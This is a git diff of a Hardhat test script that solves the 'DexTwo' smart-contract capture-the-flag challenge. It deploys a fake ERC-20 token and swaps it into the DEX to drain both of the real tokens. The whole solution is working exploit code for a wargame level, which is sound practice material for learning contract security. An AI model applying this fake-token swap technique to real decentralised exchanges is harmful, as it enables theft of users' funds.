@@ -3,13 +3,12 @@ import { Address } from "cluster";
 import { Contract, Signer, BigNumber } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel, bigNumberToEther,
-         logEvents, dumpStorage } from "./utils";
+         logEvents, dumpStorage, waitTx } from "./utils";
 
 let accounts: Signer[];
 let eoa: Signer;
 let eoaAddress: string;
-let fakeToken1: Contract;
-let fakeToken2: Contract;
+let fakeToken: Contract;
 let challenge: Contract; // challenge contract
 let tx: any;
 
@@ -25,11 +24,29 @@ before(async () => {
   challenge = await challengeFactory.attach(challengeAddress);
 
   const fakeTokenFactory = await ethers.getContractFactory(`DexTwoFakeToken`);
-  fakeToken1 = await fakeTokenFactory.deploy(eoaAddress, challenge.address);
+  fakeToken = await fakeTokenFactory.deploy("Fake Token", "FAKE");
+  await waitTx(fakeToken.initialize(eoaAddress, challenge.address));
 });
 
 it("solves the challenge", async function () {
-  // WRITE YOUR CODE HERE
+  const amount = Math.floor(Math.random() * 100);
+  await waitTx(fakeToken.resetBalances(amount));
+
+  let token1 = await challenge.token1();
+  let token2 = await challenge.token2();
+
+  await waitTx(challenge.approve(eoaAddress,1000));
+  await waitTx(challenge.approve(challenge.address, 1000));
+
+  await waitTx(fakeToken.approve(eoaAddress,1000));
+  await waitTx(fakeToken.approve(challenge.address, 1000));
+
+  await waitTx(challenge.swap(fakeToken.address, token2, amount));
+
+  await waitTx(fakeToken.resetBalances(amount));
+
+  await waitTx(challenge.swap(fakeToken.address, token1, amount));
+
 });
 
 after(async () => {
